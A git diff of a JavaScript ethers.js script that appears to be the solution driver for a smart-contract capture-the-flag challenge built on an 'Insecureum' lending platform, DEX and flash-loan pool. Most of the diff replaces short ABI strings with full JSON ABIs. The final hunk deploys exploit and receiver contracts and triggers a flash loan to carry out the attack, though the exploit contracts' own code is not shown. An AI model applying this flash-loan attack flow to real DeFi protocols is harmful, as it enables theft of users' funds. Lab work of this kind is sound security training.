@@ -38,10 +38,7 @@ console.log(
 ///////////////////////////////////////////////////
 const masterFactory = new ethers.Contract(
     "0xD93296489Cf51135b36bC0A7C1114c310a676bFD",
-    [
-        "function deployChallenge(uint256) external",
-        "function getChallengesInstances(address,uint256) external view returns(address[] memory)"
-    ],
+    [{"inputs": [{"internalType": "uint256", "name": "nChallenge", "type": "uint256"}],	"name": "deployChallenge", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "address", "name": "user", "type": "address"}, {"internalType": "uint256", "name": "instance", "type": "uint256"}], "name": "getChallengesInstances", "outputs": [{"internalType": "address[]", "name": "", "type": "address[]"}], "stateMutability": "view", "type": "function"}],
     challenger
 );
 
@@ -54,60 +51,33 @@ const challengeContracts = (
     )
 );
 
-let erc20Abi = [
-    "function totalSupply() external view returns (uint256)",
-    "function balanceOf(address account) external view returns (uint256)",
-    "function transfer(address to, uint256 amount) external returns (bool)",
-    "function allowance(address owner, address spender) external view returns (uint256)",
-    "function approve(address spender, uint256 amount) external returns (bool)",
-    "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
-];
-
 const isecToken = new ethers.Contract(
     challengeContracts[1],
-    erc20Abi,
+    [{"inputs": [{"internalType": "uint256","name": "_supply","type": "uint256"}],"stateMutability": "nonpayable","type": "constructor"},{"anonymous": false,"inputs": [{"indexed": true,"internalType": "address","name": "owner","type": "address"},{"indexed": true,"internalType": "address","name": "spender","type": "address"},{"indexed": false,"internalType": "uint256","name": "value","type": "uint256"}],"name": "Approval","type": "event"},{"anonymous": false,"inputs": [{"indexed": true,"internalType": "address","name": "from","type": "address"},{"indexed": true,"internalType": "address","name": "to","type": "address"},{"indexed": false,"internalType": "uint256","name": "value","type": "uint256"}],"name": "Transfer","type": "event"},{"inputs": [{"internalType": "address","name": "owner","type": "address"},{"internalType": "address","name": "spender","type": "address"}],"name": "allowance","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "approve","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "account","type": "address"}],"name": "balanceOf","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "decimals","outputs": [{"internalType": "uint8","name": "","type": "uint8"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "subtractedValue","type": "uint256"}],"name": "decreaseAllowance","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "addedValue","type": "uint256"}],"name": "increaseAllowance","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "name","outputs": [{"internalType": "string","name": "","type": "string"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "symbol","outputs": [{"internalType": "string","name": "","type": "string"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "totalSupply","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "to","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "transfer","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "from","type": "address"},{"internalType": "address","name": "to","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "transferFrom","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"}],
     challenger
 );
 
 const boringToken = new ethers.Contract(
     challengeContracts[2],
-    erc20Abi,
+    [{"inputs": [{"internalType": "uint256","name": "_supply","type": "uint256"}],"stateMutability": "nonpayable","type": "constructor"},{"anonymous": false,"inputs": [{"indexed": true,"internalType": "address","name": "owner","type": "address"},{"indexed": true,"internalType": "address","name": "spender","type": "address"},{"indexed": false,"internalType": "uint256","name": "value","type": "uint256"}],"name": "Approval","type": "event"},{"anonymous": false,"inputs": [{"indexed": true,"internalType": "address","name": "from","type": "address"},{"indexed": true,"internalType": "address","name": "to","type": "address"},{"indexed": false,"internalType": "uint256","name": "value","type": "uint256"}],"name": "Transfer","type": "event"},{"inputs": [{"internalType": "address","name": "owner","type": "address"},{"internalType": "address","name": "spender","type": "address"}],"name": "allowance","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "approve","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "account","type": "address"}],"name": "balanceOf","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "decimals","outputs": [{"internalType": "uint8","name": "","type": "uint8"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "subtractedValue","type": "uint256"}],"name": "decreaseAllowance","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "addedValue","type": "uint256"}],"name": "increaseAllowance","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "name","outputs": [{"internalType": "string","name": "","type": "string"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "symbol","outputs": [{"internalType": "string","name": "","type": "string"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "totalSupply","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "to","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "transfer","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "from","type": "address"},{"internalType": "address","name": "to","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "transferFrom","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"}],
     challenger
 );
 
 const dex = new ethers.Contract(
     challengeContracts[3],
-    [
-        "function addLiquidity(uint256 amount0, uint256 amount1) external",
-        "function removeLiquidity(uint256 amount) external returns (uint amount0, uint amount1)",
-        "function swap(address tokenFrom, address tokenTo, uint256 amountIn) external returns(uint256 amountOut)",
-        "function calcAmountsOut(address tokenIn, uint256 amountIn) external view returns(uint256 output)",
-        "function balanceOf(address user) external view returns(uint256)"
-    ],
+    [{"inputs": [{"internalType": "address","name": "token0Address","type": "address"},{"internalType": "address","name": "token1Address","type": "address"}],"stateMutability": "nonpayable","type": "constructor"},{"inputs": [{"internalType": "uint256","name": "amount0","type": "uint256"},{"internalType": "uint256","name": "amount1","type": "uint256"}],"name": "addLiquidity","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "user","type": "address"}],"name": "balanceOf","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "tokenIn","type": "address"},{"internalType": "uint256","name": "amountIn","type": "uint256"}],"name": "calcAmountsOut","outputs": [{"internalType": "uint256","name": "output","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "removeLiquidity","outputs": [{"internalType": "uint256","name": "amount0","type": "uint256"},{"internalType": "uint256","name": "amount1","type": "uint256"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "reserve0","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "reserve1","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "tokenFrom","type": "address"},{"internalType": "address","name": "tokenTo","type": "address"},{"internalType": "uint256","name": "amountIn","type": "uint256"}],"name": "swap","outputs": [{"internalType": "uint256","name": "amountOut","type": "uint256"}],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "token0","outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "token1","outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "","type": "address"},{"internalType": "uint256","name": "","type": "uint256"},{"internalType": "bytes","name": "","type": "bytes"}],"name": "tokenFallback","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "totalSupply","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"}],
     challenger
 );
 
 const pool = new ethers.Contract(
     challengeContracts[4],
-    [
-        "function deposit(uint256 _amount) external",
-        "function withdraw(uint256 _amount) external",
-        "function flashLoan(address borrower, bytes calldata data) external"
-    ],
+    [{"inputs": [{"internalType": "address","name": "_token","type": "address"}],"stateMutability": "nonpayable","type": "constructor"},{"inputs": [{"internalType": "address","name": "","type": "address"}],"name": "balances","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "uint256","name": "_amount","type": "uint256"}],"name": "deposit","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "borrower","type": "address"},{"internalType": "bytes","name": "data","type": "bytes"}],"name": "flashLoan","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "token","outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "uint256","name": "_amount","type": "uint256"}],"name": "withdraw","outputs": [],"stateMutability": "nonpayable","type": "function"}],
     challenger
 );
 
 const lendingPlatform = new ethers.Contract(
     challengeContracts[0],
-    [
-        "function depositToken0(uint256 amount) external",
-        "function depositToken1(uint256 amount) external",
-        "function borrowToken0(uint256 amount) external",
-        "function borrowToken1(uint256 amount) external",
-        "function liquidate(address user) external",
-        "function isSolvent(address user) public view returns (bool)",
-        "function tokenPrice(uint256 _amount) public view returns (uint256)"
-    ],
+    [{"inputs": [{"internalType": "address","name": "_oracleToken","type": "address"},{"internalType": "address","name": "_tokenInsecureum","type": "address"},{"internalType": "address","name": "_token","type": "address"}],"stateMutability": "nonpayable","type": "constructor"},{"inputs": [{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "borrowInsecureum","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "borrowToken","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "depositInsecureum","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "depositToken","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "user","type": "address"}],"name": "isSolvent","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "address","name": "user","type": "address"}],"name": "liquidate","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "token","outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "tokenInsecureum","outputs": [{"internalType": "contract IERC20","name": "","type": "address"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "uint256","name": "_amount","type": "uint256"}],"name": "tokenPrice","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"}],
     challenger
 );
 
@@ -137,10 +107,39 @@ console.log(
 console.log("Deploying Exploit Contract");
 
 //======== ADD HERE ADDITIONAL CODE IF NEEDED ========
-const exploit = await exploitFactory.deploy();
+const exploitReceiverContract = $contracts["ExploitReceiver"];
+const exploitReceiverFactory = new ethers.ContractFactory(
+    exploitReceiverContract.abi,
+    exploitReceiverContract.evm.bytecode,
+    challenger
+);
+
+const exploitReceiver = (
+    await exploitReceiverFactory
+    .deploy()
+);
+
+const exploit = (
+    await exploitFactory
+    .deploy(
+        isecToken.address,
+        boringToken.address,
+        lendingPlatform.address,
+        dex.address,
+        challengerAddress
+    )
+);
+
+let calldata = await exploitReceiver.interface.encodeFunctionData(
+    "troll",[exploit.address, isecToken.address]
+);
 
 console.log("Performing Attack ...");
 
+await pool.flashLoan(
+    exploitReceiver.address,
+    calldata
+);
 //====================================================
 
 ///////////////////////////////////////////////////
